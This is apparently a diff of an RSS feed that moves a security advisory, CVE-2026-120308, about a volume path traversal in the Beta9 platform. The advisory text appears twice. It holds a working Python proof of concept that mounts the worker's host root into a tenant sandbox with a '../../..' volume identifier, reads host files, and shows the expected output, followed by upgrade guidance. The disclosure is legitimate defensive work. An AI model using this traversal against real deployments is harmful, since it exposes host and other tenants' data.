-            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
-            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
-
-
-## Component
-
-Beta9 gateway and worker (github.com/beam-cloud/beta9)
-
-## Affected versions
-
-gateway < 0.1.776
-worker < 0.1.756
-
-## Description
-
-A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
-
-A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
-
-Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
-
-## PoC
-
-<br>
-
-**Step 1 - Install the client and select the deployment**
-
-<br>
-
-```
-pip install beta9
-beta9 configure --token <ANY_WORKSPACE_TOKEN>
-```
-
-<br>
-
-**Step 2 - Save the volume deploy**
-
-<br>
-
-The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
-
-```
-import os
-
-from beta9 import Image, function
-from beta9.abstractions.volume import Volume
-
-
-class TraversalVolume(Volume):
-    def __init__(self, volume_id: str, mount_path: str):
-        super().__init__(name="poc", mount_path=mount_path)
-        self.volume_id = volume_id
-        self.ready = True
-
-
-HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
-
-
-@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
-def read_worker_host():
-    proof = {}
-    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
-        try:
-            with open(f) as fh:
-                proof[f] = fh.read()[:200]
-        except Exception as e:
-            proof[f] = f"<unreadable: {e}>"
-    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
-    return proof
-
-
-if __name__ == "__main__":
-    result = read_worker_host.remote()
-    print("\n===== PoC result (executed inside the sandboxed container) =====")
-    for k, v in result.items():
-        print(f"\n--- {k} ---\n{v}")
-```
-
-<br>
-
-**Step 3 - Deploy and run it**
-
-<br>
-
-```
-python3 poc_volume_traversal.py
-```
-
-<br>
-
-Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
-
-```
-===== PoC result (executed inside the sandboxed container) =====
-
---- /pwn/etc/hostname ---
-<worker hostname>
-
---- /pwn/etc/resolv.conf ---
-<worker resolver configuration>
-
---- /pwn (host /) ---
-['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
-```
-
-<br>
-
-On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
-
-## Vulnerability Mitigations
-
-Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
-
-The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-120308
-https://github.com/beam-cloud/beta9/pull/1897
-https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
-https://github.com/beam-cloud/beta9
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths]]></title>
             <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</link>
             <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</guid>
@@ -1876,6 +1743,141 @@ https://www.cve.org/CVERecord?id=CVE-2026-120307
 https://github.com/beam-cloud/beta9/pull/1897
 https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
+
+
+## Component
+
+Beta9 gateway and worker (github.com/beam-cloud/beta9)
+
+## Affected versions
+
+gateway < 0.1.776
+worker < 0.1.756
+
+## Description
+
+A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
+
+A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
+
+Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the client and select the deployment**
+
+<br>
+
+```
+pip install beta9
+beta9 configure --token <ANY_WORKSPACE_TOKEN>
+```
+
+<br>
+
+**Step 2 - Save the volume deploy**
+
+<br>
+
+The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
+
+```
+import os
+
+from beta9 import Image, function
+from beta9.abstractions.volume import Volume
+
+
+class TraversalVolume(Volume):
+    def __init__(self, volume_id: str, mount_path: str):
+        super().__init__(name="poc", mount_path=mount_path)
+        self.volume_id = volume_id
+        self.ready = True
+
+
+HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
+
+
+@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
+def read_worker_host():
+    proof = {}
+    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
+        try:
+            with open(f) as fh:
+                proof[f] = fh.read()[:200]
+        except Exception as e:
+            proof[f] = f"<unreadable: {e}>"
+    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
+    return proof
+
+
+if __name__ == "__main__":
+    result = read_worker_host.remote()
+    print("\n===== PoC result (executed inside the sandboxed container) =====")
+    for k, v in result.items():
+        print(f"\n--- {k} ---\n{v}")
+```
+
+<br>
+
+**Step 3 - Deploy and run it**
+
+<br>
+
+```
+python3 poc_volume_traversal.py
+```
+
+<br>
+
+Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
+
+```
+===== PoC result (executed inside the sandboxed container) =====
+
+--- /pwn/etc/hostname ---
+<worker hostname>
+
+--- /pwn/etc/resolv.conf ---
+<worker resolver configuration>
+
+--- /pwn (host /) ---
+['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
+```
+
+<br>
+
+On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
+
+## Vulnerability Mitigations
+
+Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
+
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120308
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
 https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
